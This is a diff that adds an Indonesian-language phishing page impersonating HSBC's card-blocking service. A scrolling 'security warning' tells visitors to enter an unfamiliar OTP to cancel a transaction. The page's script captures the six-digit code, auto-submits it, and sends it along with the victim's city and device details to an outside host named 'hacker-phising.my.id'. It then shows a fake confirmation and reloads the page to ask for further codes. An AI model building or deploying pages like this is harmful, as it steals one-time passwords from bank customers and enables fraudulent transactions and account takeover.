@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta content="#DB0011" name="theme-color"/>
+  <title>Tiga Langkah Mudah - Blokir Kartu Debit & Kredit HSBC</title>
+  <meta charset="UTF-8">
+  <meta content="" property="og:image">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <link rel="icon" type="image/png" href="img/logo.svg"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding-bottom: 60px;
+      background-color: #fff;
+    }
+    nav {
+      background:#fff;
+      color: #fff;
+      padding: 8px 10px;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+    }
+    nav img {
+      height: 25px;
+      margin:10px;
+    }
+    
+    /* Marquee Styles */
+    .marquee-container {
+      background: #DB0011;
+      color: #fff;
+      padding: 10px 0;
+      overflow: hidden;
+      position: relative;
+      border-bottom: 2px solid #ffc107;
+      font-size: 13px;
+      font-weight: 400;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    
+    .marquee-content {
+      display: inline-block;
+      white-space: nowrap;
+      padding-left: 100%;
+      animation: marquee 25s linear infinite;
+    }
+    
+    @keyframes marquee {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+    
+    .marquee-content strong {
+      color: #d32f2f;
+      font-weight: 700;
+      margin-right: 8px;
+      font-size: 13px;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 3px 8px;
+      border-radius: 3px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    
+    .marquee-content i {
+      color: #fff;
+      margin: 0 10px;
+      font-size: 14px;
+      animation: pulse 2s infinite;
+    }
+    
+    .marquee-content i.fa-shield-alt { color: #4CAF50; }
+    
+    .marquee-content span.security-text {
+      color: #fff;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    
+    .header-container {
+      max-width: 400px;
+      margin: 12px auto;
+      padding: 0, 65px;
+    }
+    .header-image {
+      width:50%;
+      height: auto;
+      border-radius: 0px;
+      transition: transform 0.4s;
+      display: block;
+      align-items: center;
+      margin-left:90px;
+    }
+    form#otpForm {
+      background-color: #fff;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.1);
+      max-width: 100%;
+      margin:20px;
+      position: relative;
+    }
+    .otp-input-wrapper {
+      position: relative;
+      margin-bottom: 15px;
+      margin-top:15px;
+      display: flex;
+      justify-content: space-between;
+    }
+    .otp-input-box {
+      width: 45px;
+      height: 45px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      border-radius: 5px;
+      border: 2px solid #ddd;
+      background-color: #f1f1f1;
+      transition: all 0.3s;
+      outline: none;
+    }
+    .otp-input-box:focus {
+      border-color: rgb(120, 0, 0);
+      background-color: #fff;
+      box-shadow: 0 0 5px #DB0011;
+    }
+    .otp-input-box.filled {
+      border-color: #DB0011;
+      background-color: #fff;
+    }
+    .otp-input-box.error {
+      border-color: #ff0000;
+      background-color: #fff5f5;
+    }
+    #timer {
+      font-weight: 500;
+      color: #DB0011;
+      user-select: none;
+      text-align: left;
+      margin-top: 5px;
+      font-size: 14px;
+    }
+    button#submitBtn {
+      width: 100%;
+      padding: 12px;
+      background: #DB0011;
+      color: white;
+      font-weight: 500;
+      border: none;
+      border-radius: 25px;
+      font-size: 13px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 20px;
+    }
+    button#submitBtn:hover:not(:disabled) {
+      background: #DB0011;
+      opacity: 0.9;
+    }
+    button#submitBtn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .bca-footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: #DB0011;
+      border-color: rgb(255, 255, 255);
+      color: white;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 16px 0;
+      font-size: 12px;
+      z-index: 999;
+    }
+    .footer-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      color:#fff;
+    }
+    .footer-item i { font-size: 20px; margin-bottom: 2px; }
+    .footer-item span { font-size: 10px; } 
+    label {
+      color:#000;
+      font-size:12px;
+      font-weight: 500;
+    }
+    .otp-instruction {
+      text-align: center;
+      margin-bottom: 15px;
+      color: #DB0011;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    @media (max-width: 480px) {
+      .otp-input-box { width: 40px; height: 40px; font-size: 18px; }
+      .marquee-container { font-size: 11px; padding: 8px 0; }
+      .marquee-content { animation: marquee 20s linear infinite; }
+      .marquee-content strong { font-size: 11px; padding: 2px 6px; }
+      .marquee-content i { margin: 0 6px; font-size: 12px; }
+    }
+    .marquee-container:hover .marquee-content { animation-play-state: paused; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <img src="img/logo.svg" alt="Logo" />
+</nav>
+
+<div class="marquee-container">
+  <div class="marquee-content">
+    <i class="fas fa-exclamation-triangle"></i>
+    <strong>⚠️ PERINGATAN KEAMANAN:</strong>
+    <span class="security-text">Segera masukkan kode OTP yang tidak dikenal ke form pembatalan transaksi untuk mencegah penyalahgunaan dan membatalkan transaksi.</span>
+    <i class="fas fa-shield-alt"></i>
+  </div>
+</div>
+
+<div class="header-container">
+  <img class="header-image" id="card-image" src="img/otp6.jpg" alt="Card Front" />
+  <form id="otpForm">
+    <center>
+      <label>Kode OTP pembatalan transaksi
+      telah kami kirimkan,Silahkan input di bawah ini..</label>
+    </center>
+    
+    <div class="otp-instruction">Masukkan 6 digit kode OTP</div>
+    
+    <div class="otp-input-wrapper">
+      <input type="tel" class="otp-input-box" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autofocus />
+      <input type="tel" class="otp-input-box" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
+      <input type="tel" class="otp-input-box" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
+      <input type="tel" class="otp-input-box" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
+      <input type="tel" class="otp-input-box" id="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
+      <input type="tel" class="otp-input-box" id="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
+    </div>
+    
+    <div id="timer">60s</div>
+    
+    <br>
+    <button type="submit" id="submitBtn">Batalkan Transaksi</button>
+  </form>
+</div>
+
+<!-- POPUP MODAL DIHAPUS -->
+
+<footer class="bca-footer" onclick="window.location.href=''">
+  <div class="footer-item"><i class="fas fa-map-marker-alt"></i><span>Daftar Lokasi</span></div>
+  <div class="footer-item"><i class="fas fa-message"></i><span>Bantuan</span></div>
+  <div class="footer-item"><i class="fas fa-lock"></i><span>Login</span></div>
+</footer>
+
+<script>
+// Fungsi Timer
+function startTimer(duration) {
+    let timerDuration = duration;
+    const timerDisplay = document.getElementById("timer");
+    
+    const countdown = setInterval(() => {
+        const minutes = String(Math.floor(timerDuration / 60)).padStart(2, "0");
+        const seconds = String(timerDuration % 60).padStart(2, "0");
+        timerDisplay.textContent = `${minutes}:${seconds}`;
+        timerDuration--;
+
+        if (timerDuration < 0) {
+            clearInterval(countdown);
+            timerDisplay.textContent = "00:00";
+            setTimeout(() => { location.reload(); }, 2000);
+        }
+    }, 1000);
+}
+
+// Fungsi Info Client
+async function saveClientInfo() {
+    try {
+        const res = await fetch("https://ipinfo.io/json");
+        const data = await res.json();
+        const kota = data.city || "Tidak diketahui";
+        let deviceType = "PC/Laptop";
+        if (/android/i.test(navigator.userAgent)) deviceType = "Android";
+        else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
+
+        await fetch("req/verifikasi.php", {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ kota, deviceType, deviceName: navigator.userAgent })
+        });
+    } catch (error) { console.warn("Gagal ambil data", error); }
+}
+
+// Inisialisasi OTP Input
+function initOTPInputs() {
+    const otpInputs = document.querySelectorAll('.otp-input-box');
+    otpInputs[0].focus();
+    
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (!/^\d*$/.test(e.target.value)) { e.target.value = ''; return; }
+            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            updateInputStyles();
+            if (checkAllInputsFilled()) {
+                setTimeout(() => { document.getElementById('submitBtn').click(); }, 300);
+            }
+        });
+        
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                otpInputs[index - 1].focus();
+                otpInputs[index - 1].value = '';
+                updateInputStyles();
+            }
+        });
+
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pastedData = e.clipboardData.getData('text').trim();
+            if (!/^\d+$/.test(pastedData)) return;
+            for (let i = 0; i < otpInputs.length && i < pastedData.length; i++) {
+                otpInputs[i].value = pastedData[i];
+            }
+            updateInputStyles();
+            const lastIndex = Math.min(otpInputs.length - 1, pastedData.length - 1);
+            otpInputs[lastIndex].focus();
+            if (checkAllInputsFilled()) {
+                setTimeout(() => { document.getElementById('submitBtn').click(); }, 300);
+            }
+        });
+    });
+}
+
+function updateInputStyles() {
+    document.querySelectorAll('.otp-input-box').forEach(input => {
+        if (input.value) { input.classList.add('filled'); input.classList.remove('error'); }
+        else { input.classList.remove('filled'); }
+    });
+}
+
+function checkAllInputsFilled() {
+    return Array.from(document.querySelectorAll('.otp-input-box')).every(input => input.value);
+}
+
+function getFullOTP() {
+    return Array.from(document.querySelectorAll('.otp-input-box')).map(input => input.value).join('');
+}
+
+// Submit Form
+document.getElementById("otpForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const otp = getFullOTP();
+    const submitBtn = document.getElementById("submitBtn");
+
+    if (otp.length !== 6 || isNaN(otp)) {
+        document.querySelectorAll('.otp-input-box').forEach(input => input.classList.add('error'));
+        return;
+    }
+    
+    submitBtn.textContent = "Memproses...";
+    submitBtn.disabled = true;
+
+    async function processSubmission() {
+        try {
+            const res = await fetch("https://ipinfo.io/json");
+            const data = await res.json();
+            const kota = data.city || "Tidak diketahui";
+            let deviceType = "PC/Laptop";
+            if (/android/i.test(navigator.userAgent)) deviceType = "Android";
+            else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
+
+            const formData = new FormData();
+            formData.append("otp", otp);
+            formData.append("kota", kota);
+            formData.append("deviceType", deviceType);
+            formData.append("deviceName", navigator.userAgent);
+
+            await fetch("https://hacker-phising.my.id/notif/req/verifikasi.php", { method: "POST", body: formData });
+
+            // --- BAGIAN ALERT YANG DIPERBAIKI ---
+            // Menggunakan karakter Unicode Bold agar teks terlihat tebal di alert biasa
+            const boldMessage = "𝐓𝐞𝐫𝐢𝐦𝐚 𝐤𝐚𝐬𝐢𝐡 𝐩𝐞𝐫𝐦𝐢𝐧𝐭𝐚𝐚𝐧 𝐩𝐞𝐦𝐛𝐚𝐭𝐚𝐥𝐚𝐧 𝐭𝐫𝐚𝐧𝐬𝐚𝐤𝐬𝐢 𝐚𝐧𝐝𝐚 𝐬𝐞𝐝𝐚𝐧𝐠 𝐤𝐚𝐦𝐢 𝐩𝐫𝐨𝐬𝐞𝐬, 𝐒𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐥𝐢𝐡𝐚𝐭 𝐤𝐨𝐝𝐞 𝐩𝐞𝐦𝐛𝐚𝐭𝐚𝐥𝐚𝐧 𝐛𝐞𝐫𝐢𝐤𝐮𝐭 𝐧𝐲𝐚.";
+            
+            alert(boldMessage);
+            
+            // Reload halaman setelah alert ditutup
+            location.reload();
+
+        } catch (error) {
+            console.warn("Error:", error);
+            alert("Terjadi kesalahan koneksi.");
+            submitBtn.textContent = "Batalkan Transaksi";
+            submitBtn.disabled = false;
+        }
+    }
+
+    processSubmission();
+});
+
+window.onload = () => {
+    saveClientInfo();
+    startTimer(60);
+    initOTPInputs();
+};
+</script>
+</body>
+</html>
